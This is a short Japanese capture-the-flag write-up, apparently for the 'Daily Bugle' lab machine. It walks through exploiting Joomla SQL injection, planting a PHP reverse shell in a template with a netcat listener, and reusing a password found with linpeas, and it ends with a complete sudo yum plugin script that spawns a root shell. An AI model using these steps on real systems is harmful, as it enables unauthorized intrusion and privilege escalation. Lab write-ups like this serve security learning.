---
title: "Daily Bugle"
date: 2024-03-17T04:41:11+09:00
draft: false
---


### user.txt

- Joomla! というのが動いてる
  - ```/language/en-GB/en-GB.xml``` にアクセスするとバージョンが見える([Joomla - HackTricks]([url](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)))
- searchsploit で SQLi がヒットする
  - python のエクスプロイトコードが出ている([Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py))
  - ユーザ名とパスワードハッシュが得られる
- Joomla にログイン
  - リバースシェルが template に貼れる([Joomla: Reverse Shell](https://www.hackingarticles.in/joomla-reverse-shell/))
  - beez3 に php リバースシェルを貼る
  - save する
  - ```nc -nlvp 1234```
- リバースシェル
  - apache としてログイン，権限がなく user.txt が見れない
  - linpeas.sh でパスワードが露出していることが分かる（どういう仕組みなんだこれ）
  - ```su jjameson```

### root

- yum が使えるらしい
  - rpm ロードをやろうとしたが fpm が使えず断念

```shell
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
